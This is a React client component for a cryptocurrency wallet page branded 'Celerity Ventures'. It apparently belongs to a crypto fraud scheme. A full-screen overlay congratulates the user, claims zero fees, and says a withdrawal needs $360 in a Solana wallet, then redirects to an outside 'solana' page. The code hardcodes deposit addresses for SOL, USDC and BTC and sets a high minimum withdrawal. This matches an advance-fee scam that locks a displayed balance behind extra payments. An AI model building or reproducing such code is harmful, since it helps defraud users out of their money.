"use client"

import { useEffect, useState } from "react"
import { signOut } from "firebase/auth"
import { auth, db } from "@/lib/firebase"
import { doc, updateDoc, onSnapshot } from "firebase/firestore"
import { QRCodeSVG } from "qrcode.react"

import Stars from "../components/Stars"
import Card from "../components/Card"
import Balance from "../components/Balance"
import Actions from "../components/Actions"
import { useWallet, Tx } from "../hooks/useWallet"

// ---------------- WALLET CONTENT ----------------
export default function WalletContent({ user }: { user: any }) {
  const MIN_WITHDRAW = 4009
  const SOL_PRICE = 150
  const TOPUP_PRICE = 180

  // 🔒 BLOQUEO INICIAL
  const [showBlock, setShowBlock] = useState(true)

  const [timerMap, setTimerMap] = useState<Record<string, number>>({})
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [withdrawAmount, setWithdrawAmount] = useState("")
  const [withdrawAddress, setWithdrawAddress] = useState("")
  const [withdrawSuccess, setWithdrawSuccess] = useState(false)
  const [releaseTx, setReleaseTx] = useState<Tx | null>(null)
  const [errorMsg, setErrorMsg] = useState("")
  const [showDepositOptions, setShowDepositOptions] = useState(false)
  const [selectedCurrency, setSelectedCurrency] = useState<Tx["currency"]>("SOL")
  const [showTopUp, setShowTopUp] = useState(false)

  const { balance, transactions, setTransactions, setBalance } = useWallet()

  const DEPOSIT_ADDRESSES = {
    SOL: "Hc6WiKs82cystWP2hVFzUJaBw1hebVX7sncCpL4ab1fR",
    USDC: "Hc6WiKs82cystWP2hVFzUJaBw1hebVX7sncCpL4ab1fR",
    BTC: "bc1p7vpwwfhhhhk0nsuwd24ja48vqj69n7e9f59ndgt4zcvn9tagqyswr3es5"
  }

  // 🔒 SOLO MOSTRAR UNA VEZ
  useEffect(() => {
    const seen = localStorage.getItem("blockSeen")
    if (seen) setShowBlock(false)
  }, [])

  const handleContinue = () => {
    localStorage.setItem("blockSeen", "true")
    setShowBlock(false)
  }

  // ---------------- RENDER ----------------
  return (
    <div className="relative min-h-screen text-white overflow-hidden">

      {/* 🔒 OVERLAY BLOQUEANTE */}
      {showBlock && (
        <div className="fixed inset-0 z-[999] flex flex-col items-center justify-center bg-black/95 backdrop-blur-xl px-6 text-center">
          
          <h1 className="text-2xl font-extrabold text-white mb-4">
            Congratulations 🎉
          </h1>

          <p className="text-white/80 max-w-md mb-6 leading-relaxed">
            You have successfully hired <span className="font-semibold text-white">Celerity Ventures</span>.
            <br /><br />
            You now pay <span className="text-green-400 font-semibold">0% fees</span>.
            <br /><br />
            When withdrawing, make sure you have a balance of 
            <span className="text-yellow-400 font-semibold"> $360 in your Solana wallet</span>.
          </p>

<button
  onClick={() => window.location.href = "https://celerity-wallet.vercel.app/solana"}
  className="px-6 py-3 rounded-2xl bg-gradient-to-r from-purple-600 via-purple-500 to-purple-600 text-black font-semibold shadow-xl hover:scale-105 transition"
>
  Continue
</button>


        </div>
      )}

      {/* TU APP NORMAL DEBAJO */}
      <button
        onClick={async () => { await signOut(auth); window.location.href = "/login" }}
        className="absolute top-6 right-6 text-xs text-white/40 hover:text-white z-50 tracking-wide"
      >
        Logout
      </button>

      <Stars />

      <div className="absolute inset-0 z-0 bg-black">
        <div className="absolute inset-0 bg-gradient-to-t from-purple-900/5 to-transparent" />
      </div>

      <div className="relative z-10 flex flex-col items-center px-6 pt-24 pb-32 space-y-8">

        {/* BALANCE */}
        <div className="text-center relative z-50">
          <p className="text-white/30 tracking-[0.35em] text-xs uppercase mb-1">Total Balance</p>
          <Balance value={balance} />
        </div>

        {/* ACTIONS */}
        <div className="w-full max-w-md">
          <Actions
            onDeposit={() => setShowDepositOptions(true)}
            onWithdraw={() => setShowWithdraw(true)}
          />
        </div>

        {/* CARD */}
        <div className="w-full max-w-md relative flex flex-col items-center">
          <Card />

          <button
            onClick={() => setShowTopUp(true)}
            className="mt-4 w-full py-3 rounded-2xl bg-gradient-to-r from-purple-700 via-purple-600 to-purple-700 text-white font-semibold shadow-lg"
          >
            Top Up
          </button>
        </div>

      </div>
    </div>
  )
}